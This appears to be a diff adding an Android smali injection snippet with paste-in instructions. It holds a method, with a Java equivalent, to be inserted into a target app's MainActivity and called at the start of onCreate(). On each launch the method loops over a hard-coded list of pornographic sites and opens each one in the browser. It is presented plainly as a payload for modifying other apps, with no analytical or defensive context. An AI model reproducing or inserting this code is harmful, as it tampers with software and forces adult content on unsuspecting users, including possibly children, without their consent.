@@ -1,12 +1,120 @@
 #method. Suggested to paste it at the end of the code.
+******************************************************
+.method private iq500LoadManyUrl()V
+    .locals 14
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "()V"
+        }
+    .end annotation
 
+    .prologue
+    
+    move-object v0, p0
 
+    const-string v7, "pornhub.com,thisav.com,redtube.com"
+
+    move-object v2, v7
+
+    
+    move-object v7, v2
+
+    const-string v8, ","
+
+    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v7
+
+    move-object v3, v7
+
+    
+    const/4 v7, 0x0
+
+    move v4, v7
+
+    :goto_0
+    move v7, v4
+
+    move-object v8, v3
+
+    array-length v8, v8
+
+    if-lt v7, v8, :cond_0
+
+    return-void
+
+    
+    :cond_0
+    new-instance v7, Landroid/content/Intent;
+
+    move-object v13, v7
+
+    move-object v7, v13
+
+    move-object v8, v13
+
+    const-string v9, "android.intent.action.VIEW"
+
+    new-instance v10, Ljava/lang/StringBuffer;
+
+    move-object v13, v10
+
+    move-object v10, v13
+
+    move-object v11, v13
+
+    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V
+
+    const-string v11, "http://"
+
+    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v10
+
+    move-object v11, v3
+
+    move v12, v4
+
+    aget-object v11, v11, v12
+
+    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v10
+
+    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-static {v10}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v10
+
+    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
+
+    move-object v5, v7
+
+    
+    move-object v7, v0
+
+    move-object v8, v5
+
+    invoke-virtual {v7, v8}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->startActivity(Landroid/content/Intent;)V
+
+    
+    add-int/lit8 v4, v4, 0x1
+
+    goto :goto_0
+.end method
+******************************************************
 
 #caller. Paste it at first line of the onCreate() method
+********************************************************
 invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->iq500LoadManyUrl()V
+********************************************************
 #You have to manually change the current activity (Lchange...)
 
 #Java logic is as follows:
+********************************************************
 	private void iq500LoadManyUrl()
 	{
 		String list = "pornhub.com,thisav.com,redtube.com";
@@ -19,3 +127,4 @@ invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_
 		}
 		
 	}
+********************************************************
